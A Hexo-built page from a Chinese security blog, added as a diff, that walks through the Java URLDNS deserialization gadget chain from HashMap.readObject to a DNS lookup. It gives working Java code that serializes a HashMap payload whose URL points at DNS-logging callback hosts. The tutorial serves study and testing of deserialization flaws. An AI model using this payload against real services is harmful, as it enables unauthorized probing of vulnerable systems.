@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="Wileysec&#39;s blog">
+  <meta name="keyword" content="wileysec&#39;s blog,wiley,wileysec">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Wileysec&#39;s Blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" rel="stylesheet">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <span>Wileysec's Blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+    <div id="article-banner">
+  <h2></h2>
+  <p class="post-date">2022-06-22</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<input type="hidden" value="http://example.com/default/c180fda4a6eb.html">
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><center><h1>URLDNS利用链</h1></center>
+
+<p>[TOC]</p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><blockquote>
+<p>  URLDNS利用链如下：</p>
+<p>  <code>HashMap.readObject()</code> -&gt;  <code>HashMap.putVal()</code> -&gt; <code>HashMap.hash()</code> -&gt; <code>URL.hashCode()</code>  -&gt; <code>URLStreamHandler.hashCode()</code> -&gt; <code>URL.getHostAddress()</code> -&gt; <code>URL.getByName()</code></p>
+</blockquote>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>Java中Map集合有Key和Value，可以接受任何数据类型的数据。入口类的参数是可控的并且可以是任意类或对象。</p>
+<p>其中HashMap是Map接口的实现类，它继承了Serializable，HashMap是可被序列化的。</p>
+<p>在HashMap重写了 <code>readyObject</code> 方法</p>
+<p><img src="/default/c180fda4a6eb/image-20220711162017337.png" alt="image-20220711162017337"></p>
+<p>在 <code>readObject </code> 方法中调用了 <code>putVal</code> 方法，在 <code>putVal</code> 方法中调用了 <code>hash</code> 方法</p>
+<p><img src="/default/c180fda4a6eb/image-20220711161848032.png" alt="image-20220711161848032"></p>
+<p>继续跟进，调用了 <code>hash</code> 方法中的 <code>key</code> 参数对象的 <code>hashCode</code> 方法</p>
+<p><img src="/default/c180fda4a6eb/image-20220711162242167.png" alt="image-20220711162242167"></p>
+<p>这里，参数是哪个对象就会调用哪个对象的 <code>hashCode</code> 方法</p>
+<p>Java中的 <code>URL</code> 类，重写了 <code>hashCode</code> 方法并且可以DNS请求</p>
+<p>找到 <code>URL</code> 类，重写了 <code>hashCode</code> 方法</p>
+<p><img src="/default/c180fda4a6eb/image-20220711162803370.png" alt="image-20220711162803370"></p>
+<p>这里的逻辑是，当 <code>hashCode</code> 变量为 <code>-1</code> 时才会执行到 <code>handler.hashCode()</code> 方法</p>
+<p><code>handler</code> 变量是 <code>URLStreamHandler</code> 类</p>
+<p><img src="/default/c180fda4a6eb/image-20220711163040088.png" alt="image-20220711163040088"></p>
+<p>找到 <code>URLStreamHandler</code> 类中的 <code>hashCode</code> 方法</p>
+<p>调用了 <code>getHostAddress</code> 方法</p>
+<p><img src="/default/c180fda4a6eb/image-20220711163418611.png" alt="image-20220711163418611"></p>
+<p>再继续跟进，<code>getByName</code> 方法可以发起DNS请求</p>
+<p><img src="/default/c180fda4a6eb/image-20220711164436126.png" alt="image-20220711164436126"></p>
+<p>到这里，我们就理清楚URLDNS链的整个过程了。</p>
+<h2 id="利用链利用"><a href="#利用链利用" class="headerlink" title="利用链利用"></a>利用链利用</h2><p>在上面，我们说到 <code>hashCode</code> 变量为 <code>-1</code> 是才会执行 <code>handler.hashCode()</code> 方法，该变量默认为 <code>-1</code>，那么在利用时就会出现一个问题，在执行 <code>HashMap.put</code> 方法时就会进行一次请求，无法确认是在反序列化时进行的DNS请求还是在序列化HashMap类时，HashMap的put方法导致的DNS请求。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://168dc12f.dns.1433.eu.org&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 先设置</span></span><br><span class="line">hashCode.set(url,<span class="number">123</span>);</span><br><span class="line">hashMap.put(url,<span class="number">122</span>);</span><br><span class="line">hashCode.set(url,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="keyword">package</span> com.abc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">urldns</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://217a2aae.dns.1433.eu.org/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">123</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">122</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap,<span class="string">&quot;obj.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj,String obj_file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(obj_file));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先对 <code>hashMap</code> 对象进行序列化生成 <code>obj.ser</code> 文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用场景</span></span><br><span class="line"><span class="keyword">package</span> com.abc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">urldns</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">urldns</span>();</span><br><span class="line">        unserialize(<span class="string">&quot;obj.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(obj));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当程序接受一个序列化对象文件并反序列化操作时就读取了序列化的 <code>HashMap</code> 对象，此时 <code>HashMap</code> 的 <code>hashCode</code> 值为 <code>-1</code> ，即可进行DNS查询。</p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f.html">
+        <span class="nav-arrow">← </span>
+        
+          PHP常见的利用协议
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/Java%E5%AE%89%E5%85%A8/20a3d848dbb2.html">
+        
+          CommonCollections1利用链分析
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <hr/>
+    
+        <div id="vcomments"></div>
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">TOC</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-text">URLDNS利用链</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-nav-text">利用链</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-nav-text">利用链分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-nav-text">利用链利用</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/default/c180fda4a6eb.html';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    // $(".markdown-content img").on('error', function() {
+    //   $(this).attr('src', '/css/images/error_icon.png')
+    //   $(this).css({
+    //     'cursor': 'default'
+    //   })
+    // })
+
+    // 对图片SRC进行处理
+    var page_url = window.location.pathname.split('.');
+    imglength = $('.post-article .markdown-content img').length;
+    for(i=0;i<imglength;i++){
+       obj = $(".post-article .markdown-content img")[i];
+       var img = obj.src.split('/')[5];
+       obj.src = page_url[0] + "/" + img
+    }
+
+    $('.post-article .markdown-content img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+
+      var src = this.getAttribute('src');
+      var idx = src.lastIndexOf('?');
+      if (idx != -1) {
+          src = src.substring(0, idx);
+      }
+      $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+          $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+
+    // fancybox image
+    // imglength = $('.post-article .markdown-content img').length;
+    // for(i=0;i<imglength;i++){
+    //    obj = $(".post-article .markdown-content img")[i];
+    //    aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+    //    imghref = $(aobj).attr('src');
+    //    $('#fancybox' + i).attr('href',imghref);
+    // }
+
+
+    // zoom image
+    // $(".markdown-content img").on('click', function() {
+    //   var src = $(this).attr('src')
+    //   if (src !== '/css/images/error_icon.png') {
+    //     var imageW = $(this).width()
+    //     var imageH = $(this).height()
+
+    //     var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+    //     zoom = zoom < 1 ? 1 : zoom
+    //     zoom = zoom > 2 ? 2 : zoom
+    //     var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+    //     $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+    //     $('.image-view-wrap').addClass('wrap-active')
+    //     $('.image-view-wrap img').css({
+    //       'width': `${imageW}`,
+    //       'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+    //     })
+    //     $('html').css('overflow', 'hidden')
+
+    //     $('.image-view-wrap').on('click', function() {
+    //       $(this).remove()
+    //       $('html').attr('style', '')
+    //     })
+    //   }
+    // })
+  })();
+</script>
+
+<input type="hidden" id="valine_appid" value="GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="9olsAGq7SGWYUVcmI5RDrXid">
+
+<script src="/js/highlight/highlight.pack.js"></script>
+
+<script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    Copyright &copy; 2022 Wileysec's Blog · <a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+
+
+<script src="/js/script.js"></script>
+
+  </body>
+</html>
